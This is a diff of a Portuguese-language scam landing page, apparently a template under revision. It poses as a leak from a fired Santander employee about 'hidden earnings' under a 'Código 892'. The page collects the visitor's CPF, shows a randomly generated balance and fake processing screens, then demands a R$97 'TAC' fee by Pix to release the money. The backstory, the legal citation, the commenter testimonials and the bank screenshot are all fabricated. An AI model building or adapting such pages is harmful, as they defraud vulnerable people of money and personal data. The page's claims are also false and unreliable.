@@ -4,32 +4,30 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Protocolo de Reembolso Bancário</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #f0f2f5; font-family: 'Roboto', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+        body { background-color: #f0f2f5; }
         .alert-bar { background-color: #c00; color: #fff; text-align: center; padding: 10px; font-weight: bold; font-size: 14px; }
         .container { max-width: 600px; margin: 0 auto; background: #fff; min-height: 100vh; position: relative; }
         .page { display: none; padding: 20px; }
         .page.active { display: block; }
-        
         .online-tag { background: #000; color: #00ff00; text-align: center; font-size: 10px; padding: 5px; font-weight: bold; }
-
-        /* Botão Moderno Arredondado */
-        .btn-modern { font-family: 'Montserrat', sans-serif; background: #28a745; color: white; font-size: 20px; font-weight: 900; padding: 22px; border-radius: 50px; text-align: center; display: block; width: 100%; animation: grow 1.5s infinite alternate; text-transform: uppercase; border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3); }
+        
+        /* Botão Arredondado Moderno */
+        .btn-modern { font-family: 'Montserrat', sans-serif; background: #28a745; color: white; font-size: 20px; font-weight: 900; padding: 20px; border-radius: 50px; text-align: center; display: block; width: 100%; animation: grow 1.5s infinite alternate; text-transform: uppercase; border: none; cursor: pointer; }
         @keyframes grow { from { transform: scale(1); } to { transform: scale(1.02); } }
 
-        .loading-circle { border: 6px solid #f3f3f3; border-top: 6px solid #28a745; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loading-circle { border: 8px solid #f3f3f3; border-top: 8px solid #28a745; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .comment-item { display: flex; gap: 12px; margin-bottom: 20px; border-bottom: 1px solid #f0f0f0; padding-bottom: 15px; }
-        .comment-item img { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; }
-        .comment-name { color: #385898; font-weight: bold; font-size: 14px; }
-        .comment-text { font-size: 15px; color: #1c1e21; line-height: 1.4; }
-        .comment-meta { font-size: 12px; color: #90949c; margin-top: 4px; }
-        
-        input { font-family: 'Montserrat', sans-serif; border-radius: 50px !important; }
+        /* Comentários Layout 2026 */
+        .comment-item { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .comment-item img { width: 45px; height: 45px; border-radius: 50%; }
+        .comment-name { color: #000; font-weight: 700; font-size: 15px; }
+        .comment-text { font-size: 15px; color: #1c1e21; margin-top: 2px; }
+        .comment-meta { font-size: 12px; color: #90949c; margin-top: 5px; }
     </style>
 </head>
 <body>
@@ -40,7 +38,7 @@
     <div class="container">
         
         <div id="p1" class="page active">
-            <h1 class="text-[26px] font-[900] text-center leading-tight mb-4 font-['Montserrat']">Ex-Funcionário do Santander VAZA Brecha: <span class="bg-yellow-300 text-[#c00] px-1">"CPFs podem resgatar rendimentos ocultos acumulados hoje"</span></h1>
+            <h1 class="text-[26px] font-[900] text-center leading-tight mb-4">Ex-Funcionário do Santander VAZA Brecha: <span class="bg-yellow-300 text-[#c00] px-1">"CPFs podem resgatar rendimentos ocultos acumulados hoje"</span></h1>
             
             <div class="flex items-center mb-4 border-b pb-4">
                 <img src="https://github.com/portal-verificador-br/robertomenezes/blob/main/robertoitau.png?raw=true" class="w-12 h-12 rounded-full mr-3">
@@ -48,17 +46,14 @@
             </div>
 
             <p class="text-lg mb-4">Preste muita atenção no que vou te falar. Fui demitido após 20 anos no Santander por um motivo: eu tentei ajudar uma cliente idosa que estava sem dinheiro para comprar remédio e tentou fazer um empréstimo de R$ 150,00. Não aguentei ver o banco negando aquilo e ativei a chave de rendimentos para resgatar o que era dela. 20 minutos depois me mandaram embora.</p>
-            
             <p class="text-lg mb-4">O que os bancos escondem de você é a <b>CHAVE DOS RENDIMENTOS OCULTOS</b> Internamente chamamos de CÓDIGO 892. Toda vez que você movimenta sua conta ou paga uma taxa, o banco gera um rendimento extra que deveria ser seu, mas eles retêm para lucrar bilhões.</p>
-            
             <p class="text-lg mb-4">Oficialmente pela Lei nº 8.036 essa chave só é liberada para <b>CLIENTES COM RENDA ACIMA DE R$ 25.000,00 COMPROVADA</b>. Mas eu copiei o acesso antes de sair do prédio do protocolo que permite qualquer pessoa consultar seu saldo e ativar o saque através de uma chave de ativação única. É simples: você só precisa gerar, ativar sua chave no seu banco e pronto, saque seu saldo dos rendimentos ocultos. Após a ativação você irá receber meu Whatsapp Pessoal, se tiver alguma dúvida é só me chamar que eu te ajudo.</p>
-
             <p class="text-lg mb-4">Meu irmão ativou a chave dele hoje mais cedo no Inter e o valor desbloqueou na conta dele no mesmo instante, veja abaixo:</p>
-
+            
             <img src="https://github.com/portal-verificador-br/robertomenezes/blob/main/inter.png?raw=true" class="w-full border-2 border-black rounded-lg my-4 shadow-lg">
 
             <div class="bg-yellow-50 border-2 border-dashed border-yellow-400 p-6 rounded-xl text-center my-6">
-                <button onclick="nextPage(2)" class="btn-modern">🔓 CONSULTAR MEU SALDO</button>
+                <button onclick="nextPage(2)" class="btn-modern">🔓 CONSULTAR VALORES DISPONÍVEIS</button>
             </div>
 
             <div class="mt-10">
@@ -73,7 +68,7 @@
                 </div>
                 <div class="comment-item">
                     <img src="https://randomuser.me/api/portraits/men/15.jpg">
-                    <div><p class="comment-name">Ricardo Santos</p><p class="comment-text">Trabalhei em banco e sei que o 892 existe mesmo. Finalmente alguém abriu o bico.</p><p class="comment-meta">Curtir · Responder · 12 min</p></div>
+                    <div><p class="comment-name">Ricardo Santos</p><p class="comment-text">Trabalhei em banco e sei que o 892 existe mesmo. Finalmente abriu o bico.</p><p class="comment-meta">Curtir · Responder · 12 min</p></div>
                 </div>
                 <div class="comment-item">
                     <img src="https://randomuser.me/api/portraits/women/22.jpg">
@@ -85,11 +80,11 @@
                 </div>
                 <div class="comment-item">
                     <img src="https://randomuser.me/api/portraits/women/65.jpg">
-                    <div><p class="comment-name">Sandra Alencar</p><p class="comment-text">Consegui pro meu pai tbm, ele ficou super feliz com o dinheiro extra.</p><p class="comment-meta">Curtir · Responder · 30 min</p></div>
+                    <div><p class="comment-name">Sandra Alencar</p><p class="comment-text">Consegui pro meu pai tbm, ele ficou super feliz.</p><p class="comment-meta">Curtir · Responder · 30 min</p></div>
                 </div>
                 <div class="comment-item">
                     <img src="https://randomuser.me/api/portraits/men/88.jpg">
-                    <div><p class="comment-name">Paulo André</p><p class="comment-text">Duvidei no começo mas é real. Protocolo 892 ativado com sucesso.</p><p class="comment-meta">Curtir · Responder · 45 min</p></div>
+                    <div><p class="comment-name">Paulo André</p><p class="comment-text">Duvidei no começo mas é real. Protocolo 892 ativado.</p><p class="comment-meta">Curtir · Responder · 45 min</p></div>
                 </div>
                 <div class="comment-item">
                     <img src="https://randomuser.me/api/portraits/women/33.jpg">
@@ -107,78 +102,76 @@
         </div>
 
         <div id="p2" class="page">
-            <h2 class="text-xl font-black text-center mb-8 uppercase font-['Montserrat']">Verificador de Rendimentos</h2>
-            <input type="tel" id="cpf_user" oninput="mask(this, '###.###.###-##')" class="w-full p-5 bg-gray-100 outline-none font-bold text-center text-xl mb-6 border-2 border-transparent focus:border-green-500" placeholder="SEU CPF AQUI">
-            <button onclick="loader(3, 4, 'Vasculhando rendimentos acumulados desde 2021...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
+            <h2 class="text-xl font-black text-center mb-8 italic uppercase">Consulta de Rendimentos</h2>
+            <input type="tel" id="cpf_user" oninput="mask(this, '###.###.###-##')" class="w-full p-5 bg-gray-100 rounded-full outline-none font-bold text-center text-xl mb-6 border-2 border-transparent focus:border-green-500" placeholder="000.000.000-00">
+            <button onclick="loader(3, 4, 'Buscando rendimentos ocultos...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
         </div>
 
         <div id="p3" class="page text-center py-20">
             <div class="loading-circle"></div>
-            <h3 id="load-text" class="text-xl font-bold font-['Montserrat']">Buscando...</h3>
+            <h3 id="load-text" class="text-xl font-bold">Processando...</h3>
         </div>
 
         <div id="p4" class="page text-center">
-            <h2 class="text-2xl font-black text-green-600 mb-6 uppercase font-['Montserrat']">Rendimentos Encontrados!</h2>
-            <div class="bg-gray-900 text-white p-10 rounded-[30px] mb-8 shadow-2xl">
-                <p class="text-[10px] font-bold text-gray-400 uppercase mb-2">Rendimentos Ocultos Acumulados desde 2021</p>
+            <h2 class="text-3xl font-black text-green-600 mb-6 uppercase">Valor Localizado!</h2>
+            <div class="bg-gray-900 text-white p-10 rounded-2xl mb-8">
+                <p class="text-[10px] font-bold text-gray-400 uppercase mb-2">Rendimentos Acumulados desde 2021</p>
                 <p class="text-5xl font-black">R$ <span id="rand_val">0,00</span></p>
             </div>
             <button onclick="nextPage(5)" class="btn-modern">GERAR CHAVE DE SAQUE</button>
         </div>
 
         <div id="p5" class="page text-center">
-            <h2 class="text-xl font-black mb-6 uppercase font-['Montserrat']">Selecione onde quer sacar</h2>
+            <h2 class="text-xl font-black mb-6 uppercase">Onde deseja sacar?</h2>
             <div class="grid grid-cols-2 gap-2 mb-8">
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">ITAÚ</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">BRADESCO</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">CAIXA</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">SANTANDER</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">BANCO DO BRASIL</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">NUBANK</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">INTER</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">C6 BANK</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">PAGBANK</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-full font-bold cursor-pointer text-sm">PICPAY</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">ITAÚ</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BRADESCO</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">CAIXA</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BB</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">SANTANDER</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">NUBANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">INTER</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">C6 BANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">PAGBANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">PICPAY</div>
             </div>
-            <button onclick="loader(6, 7, 'Gerando Chave de Ativação Única...', 6000)" class="btn-modern">GERAR AGORA</button>
+            <button onclick="loader(6, 7, 'Gerando chave criptografada...', 6000)" class="btn-modern">GERAR CHAVE</button>
         </div>
 
         <div id="p6" class="page text-center py-20">
             <div class="loading-circle"></div>
-            <h3 class="text-lg font-bold font-['Montserrat']">Criptografando...</h3>
+            <h3 class="text-lg font-bold">Validando no Servidor...</h3>
         </div>
 
         <div id="p7" class="page text-center">
-            <h2 class="text-xl font-black mb-6 uppercase italic font-['Montserrat']">Chave Pronta para Ativação</h2>
-            <div class="bg-gray-100 p-6 text-2xl font-mono font-black border-2 border-dashed border-gray-400 rounded-xl mb-8">892-TX-2026</div>
-            <button onclick="finalLoader()" class="btn-modern">ATIVAR E RECEBER SALDO</button>
+            <h2 class="text-xl font-black mb-6 uppercase italic">Chave de Saque Gerada</h2>
+            <div class="bg-gray-100 p-6 text-2xl font-mono font-black border-2 border-dashed border-gray-400 mb-8 rounded-xl">892-TX-2026</div>
+            <button onclick="finalLoader()" class="btn-modern">ATIVAR E SACAR AGORA</button>
         </div>
 
         <div id="p8" class="page text-center py-20">
             <div class="loading-circle" style="border-top-color:#c00"></div>
-            <p class="text-5xl font-black font-['Montserrat']" id="final-pct">0%</p>
-            <h3 class="text-lg font-bold mt-4">Integrando ao Banco Central...</h3>
+            <p class="text-5xl font-black" id="final-pct">0%</p>
+            <h3 class="text-lg font-bold mt-4">Integrando chave...</h3>
         </div>
 
         <div id="p9" class="page text-center">
-            <div class="border-t-8 border-red-600 p-6 shadow-2xl rounded-xl">
-                <h3 class="text-2xl font-black text-red-600 mb-4 uppercase font-['Montserrat']">Falha na Integração</h3>
-                <p class="text-sm mb-6 text-gray-600">Para concluir o resgate dos rendimentos ocultos, o sistema exige o pagamento da <b>Taxa de Chave para Saque de Rendimentos (TAC)</b>.</p>
-                <div class="bg-gray-100 p-6 rounded-2xl mb-6">
-                    <p class="text-4xl font-black">R$ 97,00</p>
-                </div>
-                <button onclick="nextPage(10)" class="btn-modern" style="background:#c00">PAGAR TAXA E ATIVAR CHAVE</button>
+            <div class="border-t-8 border-red-600 p-6 shadow-xl">
+                <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Erro de Ativação</h3>
+                <p class="text-sm mb-6">Pague a <b>Taxa de Chave para Saque de Rendimentos (TAC)</b> para liberar seu saldo imediatamente.</p>
+                <div class="bg-gray-100 p-6 rounded-xl mb-6"><p class="text-4xl font-black">R$ 97,00</p></div>
+                <button onclick="nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR</button>
             </div>
         </div>
 
         <div id="p10" class="page">
-            <h2 class="text-xl font-black text-center mb-2 uppercase italic font-['Montserrat']">Finalize sua Ativação</h2>
-            <p class="text-center text-sm text-gray-500 mb-6 italic">Ative no seu banco para gerar seu saque imediato</p>
-            <div class="border p-6 rounded-[30px] text-center bg-gray-50 shadow-inner">
-                <p class="text-red-600 font-bold mb-4 font-['Montserrat']">EXPIRA EM: <span id="timer">05:00</span></p>
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=CHAVE_PIX_ESTATICA" class="mx-auto mb-4 border-4 border-white shadow">
-                <button onclick="alert('Copiado!')" class="w-full bg-blue-600 text-white font-black py-4 rounded-full mb-4 font-['Montserrat']">COPIA E COLA PIX</button>
-                <p class="text-[10px] text-gray-400 uppercase font-bold">Processado via Protocolo 892 - Santander Inc.</p>
+            <h2 class="text-xl font-black text-center mb-2 uppercase italic">Finalize a ativação da sua chave</h2>
+            <p class="text-center text-sm text-gray-500 mb-6 italic">Ative no seu banco para gerar seu saque</p>
+            <div class="border p-6 rounded-xl text-center bg-gray-50 shadow-inner">
+                <p class="text-red-600 font-bold mb-4">EXPIRA EM: <span id="timer">05:00</span></p>
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=CHAVE_PIX_AQUI" class="mx-auto mb-4 border-4 border-white">
+                <button onclick="alert('Copiado!')" class="w-full bg-blue-600 text-white font-black py-4 rounded-full mb-4">COPIA E COLA PIX</button>
+                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Protocolo 892 - Santander Inc.</p>
             </div>
         </div>
 
@@ -232,8 +225,8 @@
         }
 
         function sel(el) {
-            document.querySelectorAll('#p5 div').forEach(d => { d.style.borderColor = "#ddd"; d.style.backgroundColor = "transparent"; d.style.color = "#000"; });
-            el.style.borderColor = "#28a745"; el.style.backgroundColor = "#28a745"; el.style.color = "#fff";
+            document.querySelectorAll('#p5 div').forEach(d => { d.style.borderColor = "#ddd"; d.style.backgroundColor = "transparent"; });
+            el.style.borderColor = "#28a745"; el.style.backgroundColor = "#e8f5e9";
         }
 
         setInterval(() => {
